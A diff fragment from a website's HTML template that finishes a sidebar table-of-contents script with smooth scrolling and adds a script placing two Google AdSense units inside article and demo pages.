+          entries.forEach(function(e) { observer.observe(e.el); });
+
+          // Smooth scroll for sidebar links
+          sidebar.addEventListener('click', function(e) {
+            var a = e.target.closest('a');
+            if (!a) return;
+            var id = a.getAttribute('href').replace('#', '');
+            var target = document.getElementById(id);
+            if (target) {
+              e.preventDefault();
+              target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+              history.replaceState(null, '', '#' + id);
+            }
+          });
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', buildSidebarToC);
+        } else {
+          buildSidebarToC();
+        }
+      })();
+    </script>
+
+    <!-- ME3: Inline ad injection — inserts 2 ads per article (post-intro + mid-article) -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        var pubId  = 'ca-pub-9373816755142401';
+        var slotId = '9879569728';
+        if (!pubId || !slotId) return;
+
+        function createAdUnit(label) {
+          var wrapper = document.createElement('div');
+          wrapper.className = 'ad-container ad-inline';
+          wrapper.setAttribute('data-ad-label', label);
+          wrapper.innerHTML =
+            '<ins class="adsbygoogle"' +
+            ' style="display:block"' +
+            ' data-ad-client="' + pubId + '"' +
+            ' data-ad-slot="' + slotId + '"' +
+            ' data-ad-format="auto"' +
+            ' data-full-width-responsive="true"></ins>';
+          return wrapper;
+        }
+
+        function injectAds() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          var allP = article.querySelectorAll('p');
+          if (allP.length < 6) return;
+
+          // Ad 1: after paragraph 3 (post-intro)
+          var introTarget = allP[2];
+          if (introTarget && introTarget.parentNode) {
+            var ad1 = createAdUnit('post-intro');
+            introTarget.parentNode.insertBefore(ad1, introTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+
+          // Re-query after first insertion, place mid-article ad
+          allP = article.querySelectorAll('p');
+          var midIdx = Math.floor(allP.length / 2);
+          if (midIdx < 6) midIdx = 6;
+          var midTarget = allP[midIdx];
+          if (midTarget && midTarget.parentNode) {
+            var ad2 = createAdUnit('mid-article');
+            midTarget.parentNode.insertBefore(ad2, midTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', injectAds);
+        } else {
+          injectAds();
+        }
+      })();
+    </script>
+</body>
+</html>
